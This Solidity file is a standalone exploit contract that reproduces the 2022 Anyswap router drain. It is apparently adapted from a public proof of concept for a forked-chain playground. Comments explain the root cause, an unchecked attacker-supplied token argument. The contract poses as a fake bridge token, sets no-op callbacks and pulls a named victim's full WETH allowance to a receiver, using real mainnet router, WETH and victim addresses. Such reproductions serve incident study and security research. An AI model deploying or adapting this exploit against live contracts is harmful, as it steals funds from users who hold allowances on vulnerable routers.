// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-01-Anyswap).
//
// The DeFiHackLabs PoC (test/Anyswap_exp.sol) runs the attack INLINE in the
// Foundry test contract: the test itself plays the role of the malicious `token`
// (its `underlying()` returns WETH; `depositVault`/`burn` are no-ops) and calls
// `AnyswapV4Router.anySwapOutUnderlyingWithPermit(...)`. There is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of that
// inline attack so the playground can deploy it and record `run()`. Logic and
// constants are copied verbatim from the test (the WETH `permit` is a no-op on
// the fork because the victim's WETH allowance is already MAX_UINT in the dump).
//
// Root cause: AnyswapV4Router.anySwapOutUnderlyingWithPermit trusts an
// attacker-supplied `token` argument as a legitimate Anyswap bridge token. It
// calls `token.underlying()` to fetch the underlying, then does a real
// `WETH.transferFrom(from → token, amount)`, then calls `token.depositVault`
// and `token.burn` (both no-ops on the fake token). The net effect is the real
// underlying (WETH) is pulled into the attacker-controlled `token` with no real
// cross-chain burn — a permissionless drain of any account whose underlying the
// caller can pull via permit/allowance.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function permit(address target, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IAnyswapV4Router {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
}

contract AnyswapDrain {
    // The Anyswap V4 router (vulnerable contract) on Ethereum mainnet.
    IAnyswapV4Router constant ROUTER = IAnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    // WETH9 on Ethereum mainnet — the underlying token that gets drained.
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // The victim whose WETH allowance the attack pulls via the router. Its WETH
    // balance and victim->router allowance are already set in the fork dump.
    address constant VICTIM = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;
    // Receiver of the drained WETH (set to the playground attacker EOA so profit
    // is measured there). Overridden via constructor for flexibility.
    address public immutable receiver;

    // Same amount as the DeFiHackLabs PoC: the victim's full WETH balance.
    uint256 constant AMOUNT = 308_636_644_758_370_382_903;

    constructor(address _receiver) {
        receiver = _receiver;
    }

    // The recorded entrypoint. This contract IS the malicious `token`: it returns
    // WETH from `underlying()`, and its `depositVault`/`burn` are no-ops, so the
    // router's real `WETH.transferFrom(victim → this)` is never offset by a burn.
    function run() external {
        ROUTER.anySwapOutUnderlyingWithPermit(
            VICTIM, // from   — whose WETH is pulled
            address(this), // token — THIS contract is the fake anyToken
            receiver, // to
            AMOUNT, // amount
            100_000_000_000_000_000_000, // deadline (far future)
            0, // v (dummy — victim->router allowance already MAX_UINT in the dump)
            bytes32(uint256(0x3078)), // r (dummy)
            bytes32(uint256(0x3078)), // s (dummy)
            56 // toChainID — the router emits LogAnySwapOut as if bridging to BSC
        );
        // Forward the drained WETH to the receiver (the attacker EOA).
        WETH.transfer(receiver, AMOUNT);
    }

    // --- malicious fake anyToken callbacks (the trust boundary the router never checks) ---

    // Router calls this (staticcall) to learn the "underlying" — return WETH so the
    // real `WETH.transferFrom(victim → token)` pulls real value into THIS contract.
    function underlying() external view returns (address) {
        return address(WETH);
    }

    // Router calls this after the transferFrom expecting it to mint anyTokens.
    // No-op: nothing is minted; the underlying stays here.
    function depositVault(uint256, address) external returns (uint256) {
        return 1;
    }

    // Router's _anySwapOut calls this expecting a cross-chain burn of anyTokens.
    // No-op: nothing is burned (there were never any anyTokens).
    function burn(address, uint256) external returns (bool) {
        return true;
    }
}
